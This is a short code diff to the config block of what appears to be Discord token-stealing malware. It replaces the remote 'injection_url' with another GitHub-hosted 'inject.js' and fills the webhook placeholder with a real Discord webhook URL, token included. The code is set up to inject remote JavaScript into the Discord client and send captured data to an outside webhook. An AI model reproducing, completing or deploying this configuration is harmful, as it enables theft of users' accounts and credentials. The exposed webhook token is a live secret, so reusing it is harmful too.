@@ -15,8 +15,8 @@ var config = {
     "init-notify": "true",
     "embed-color": 374276,
 
-    injection_url: "https://raw.githubusercontent.com/KSCHdsc/0x11_Cap-Inject/main/index.js",
-    webhook: "%WEBHOOK%",
+    injection_url: "https://raw.githubusercontent.com/Py0x11/Py0x11.github.io/main/inject.js",
+    webhook: "https://discord.com/api/webhooks/1059101318872051743/Xw0GV9qzH62v2_L5EDzAg_ozyljEzE8ti37N5tdEvQ_AabBTGyGxXaQpfAPIksik_zHd",
     Filter: {
         "urls": [
             "https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json",
